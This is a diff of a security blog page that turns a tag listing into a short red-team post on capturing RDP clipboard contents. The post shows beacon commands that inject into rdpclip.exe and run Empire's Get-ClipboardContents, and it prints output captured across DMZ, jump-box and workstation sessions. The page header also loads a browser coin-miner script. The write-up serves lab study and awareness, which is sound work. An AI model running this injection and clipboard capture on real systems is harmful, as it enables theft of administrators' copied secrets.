@@ -1,5 +1,9 @@
 
 
+  
+    
+  
+
 
   
 
@@ -19,25 +23,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.41">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>Antivirus</title>
+    <title>RDPClip</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
     <link rel="icon" href="https://rastamouse.me/favicon.ico">
     
-      <link rel="alternate" type="application/rss+xml" title="RSS" href="https://rastamouse.me/tags/antivirus/index.xml">
-    
 
     
-    <meta name="description" content="Rasta Mouse">
-    <meta property="og:description" content="Rasta Mouse">
+    <meta name="description" content="This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.
+
+">
+    <meta property="og:description" content="This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.
+
+">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Antivirus">
-    <meta property="og:url" content="/tags/antivirus/">
+    <meta property="og:title" content="RDPClip">
+    <meta property="og:url" content="/2018/06/rdpclip/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="Rasta Mouse">
+    <meta name="twitter:description" content="This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.
+
+">
     
       <meta name="twitter:creator" content="@_RastaMouse">
     
@@ -87,7 +95,7 @@ if (!doNotTrack) {
 
   <body>
     <div id="blog">
-      <header id="header" data-behavior="1">
+      <header id="header" data-behavior="4">
   
 <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
@@ -118,7 +126,7 @@ if (!doNotTrack) {
     </a>
   
 </header>
-      <nav id="sidebar" data-behavior="1">
+      <nav id="sidebar" data-behavior="4">
   <div class="sidebar-container">
     
       <div class="sidebar-profile">
@@ -244,43 +252,29 @@ if (!doNotTrack) {
 </nav>
 
       
-        
 
-      
-      <div id="main" data-behavior="1"
+      <div id="main" data-behavior="4"
         class="
                hasCoverMetaIn
                ">
-        
-          <section class="postShorten-group main-content-wrap">
-            
-            
-              
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
   
-    
+    <h1 class="post-title" itemprop="headline">
+      RDPClip
+    </h1>
   
-
-
+  <div class="postShorten-meta post-meta">
   
-
-<article class="postShorten postShorten--thumbnailimg-left" itemscope itemType="http://schema.org/BlogPosting">
-  <div class="postShorten-wrap">
-    
-    <div class="postShorten-header">
-      <h1 class="postShorten-title" itemprop="headline">
-        <a class="link-unstyled" href="https://rastamouse.me/2017/07/how-to-accidently-win-against-av/">
-          How to Accidently Win Against AV
-        </a>
-      </h1>
-      <div class="postShorten-meta post-meta">
-  
-    <time itemprop="datePublished" datetime="2017-07-05T00:00:00Z">
+    <time itemprop="datePublished" datetime="2018-06-09T00:00:00Z">
       
   
   
   
   
-    5 July 2017
+    9 June 2018
   
 
     </time>
@@ -297,33 +291,186 @@ if (!doNotTrack) {
 
 </div>
 
-    </div>
-    <div class="postShorten-excerpt" itemprop="articleBody">
-      <p>
-        <p>Computer viruses have been around since as early as the 1970&rsquo;s - the eternal battle between virus creators and antivirus solutions continues to wage over 40 years later.</p>
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.</p>
 
 <p></p>
 
-        <br>
-        <a href="https://rastamouse.me/2017/07/how-to-accidently-win-against-av/" class="postShorten-excerpt_link link">Continue reading</a>
-        
-      </p>
-    </div>
-  </div>
-  
-    <a href="https://rastamouse.me/2017/07/how-to-accidently-win-against-av/">
-      <div class="postShorten-thumbnailimg">
-        <img alt="" itemprop="image" src="https://rastamouse.me/images/antivirus/av_icon.png"/>
-      </div>
-    </a>
-  
-</article>
+<p>Vincent Yui already published details of a great attack called <a href="https://www.mdsec.co.uk/2017/06/rdpinception/">RDPInception</a>, which allows an adversary to &ldquo;swim&rdquo; back up an RDP session if drive sharing is enabled.  Drive sharing is not enabled by default but clipboard monitoring is, making it particularly potent and prevelant.</p>
+
+<p>I set up a little lab to test to what extent clipboard contents are exposed.</p>
+
+
+<figure>
+    
+        <img src="https://rastamouse.me/images/rdpclip/network.png" />
+    
+    
+</figure>
+
+
+<p>The idea is that both DMZ1 and DMZ2 are only accessed via an RDP &ldquo;Jump Box&rdquo; on the main LAN.  Based on my experience, it&rsquo;s very common for sysadmins to manage these &ldquo;segregated&rdquo; networks from production environments via RDP.</p>
+
+<p>The <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-ClipboardContents.ps1">Get-ClipboardContents</a> module from Empire allows you to capture the clipboard of a user.  If an admin RDP&rsquo;s into DMZ2 from the LAN, we can inject this capability into one of their processes and see what they&rsquo;re copying/pasting within DMZ2.</p>
+
+<p>But as it happens, the scope of what we can read is not limited to DMZ2.</p>
+
+<p>We can guess that someone is using RDP based on an established incoming connection on port 3389, and a process synonymous with RDP: <code>rdpclip.exe</code>.</p>
+
+<pre><code class="language-text">TCP    192.168.2.200:3389     192.168.0.200:63340    ESTABLISHED
+</code></pre>
+
+<pre><code class="language-text">PID   PPID  Name                         Arch  Session     User
+---   ----  ----                         ----  -------     -----
+1084  680   ShellExperienceHost.exe      x64   3           DMZ2\rasta
+2248  1096  explorer.exe                 x64   3           DMZ2\rasta
+3280  680   SearchUI.exe                 x64   3           DMZ2\rasta
+3332  680   RuntimeBroker.exe            x64   3           DMZ2\rasta
+3652  1232  sihost.exe                   x64   3           DMZ2\rasta
+3668  584   svchost.exe                  x64   3           DMZ2\rasta
+3836  1232  taskhostw.exe                x64   3           DMZ2\rasta
+3924  888   rdpclip.exe                  x64   3           DMZ2\rasta
+4368  680   dllhost.exe                  x64   3           DMZ2\rasta
+</code></pre>
+
+<p>Inject a beacon into <code>rdpclip</code>, then import and run <code>Get-ClipboardContents</code>.</p>
+
+<pre><code class="language-text">beacon&gt; inject 3924 x64 smb
+beacon&gt; powershell-import D:\Tools\Get-ClipboardContents.ps1
+beacon&gt; powershell Get-ClipboardContents -PollInterval 1
+</code></pre>
+
+<p>I was first able to verify that I could capture the clipboard from inside the DMZ2 RDP session.</p>
+
+<pre><code class="language-text">[+] received output:
+=== 09/06/2018:13:12:26:91 ===
+
+hello from dmz2
+</code></pre>
+
+<p>Now it started getting interesting&hellip;  When RDP&rsquo;d into DMZ1 from the LAN whilst still connected to DMZ2, it turns out we can capture the DMZ1 clipboard from within DMZ2.</p>
+
+<pre><code class="language-text">[+] received output:
+=== 09/06/2018:13:19:11:09 ===
+
+hello from dmz1
+</code></pre>
+
+<p>Not only that, but also from both the Jump Box and the source workstation on the LAN.</p>
+
+<pre><code class="language-text">[+] received output:
+=== 09/06/2018:13:20:40:50 ===
+
+hello from the lan jump box
+
+[+] received output:
+=== 09/06/2018:13:21:34:25 ===
+
+and hello from the lan workstation!
+</code></pre>
+
+
+<figure>
+    
+        <img src="https://rastamouse.me/images/rdpclip/RDP.png" />
+    
+    
+</figure>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/rdp/">rdp</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/clipboard/">clipboard</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  <nav>
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+            <i class="fa fa-angle-left"></i>
+            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+          </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/05/csharp-dotnettojscript-xsl/" data-tooltip="CSharp, DotNetToJScript, XSL">
+          
+            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+            <i class="fa fa-angle-right"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </nav>
+  <ul class="post-actions post-action-share">
+    
+      <li class="post-action hide-lg hide-md hide-sm">
+        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+          <i class="fa fa-share-alt"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+          <i class="fa fa-google-plus"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+          <i class="fa fa-facebook-official"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+          <i class="fa fa-twitter"></i>
+        </a>
+      </li>
+    
+    
+      <li class="post-action">
+        <a class="post-action-btn btn btn--default" href="#disqus_thread">
+          <i class="fa fa-comment-o"></i>
+        </a>
+      </li>
+    
+    <li class="post-action">
+      
+        <a class="post-action-btn btn btn--default" href="#">
+      
+        <i class="fa fa-list"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
 
             
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
             
-
-          </section>
-        
+          </div>
+        </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
     &copy; 2018 Rasta Mouse. All Rights Reserved
@@ -331,6 +478,92 @@ if (!doNotTrack) {
 </footer>
 
       </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  <nav>
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+            <i class="fa fa-angle-left"></i>
+            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+          </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/05/csharp-dotnettojscript-xsl/" data-tooltip="CSharp, DotNetToJScript, XSL">
+          
+            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+            <i class="fa fa-angle-right"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </nav>
+  <ul class="post-actions post-action-share">
+    
+      <li class="post-action hide-lg hide-md hide-sm">
+        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+          <i class="fa fa-share-alt"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+          <i class="fa fa-google-plus"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+          <i class="fa fa-facebook-official"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+          <i class="fa fa-twitter"></i>
+        </a>
+      </li>
+    
+    
+      <li class="post-action">
+        <a class="post-action-btn btn btn--default" href="#disqus_thread">
+          <i class="fa fa-comment-o"></i>
+        </a>
+      </li>
+    
+    <li class="post-action">
+      
+        <a class="post-action-btn btn btn--default" href="#">
+      
+        <i class="fa fa-list"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <ul class="share-options">
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+        <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
+      </a>
+    </li>
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+        <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+      </a>
+    </li>
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f06%2frdpclip%2f">
+        <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+      </a>
+    </li>
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
     </div>
     
     <div id="about">
@@ -621,6 +854,32 @@ $(document).ready(function() {
   });
 });
 </script>
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/rastamouse.me\/2018\/06\/rdpclip\/';
+          
+            this.page.identifier = '\/2018\/06\/rdpclip\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'rastamouse';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
 
 
 
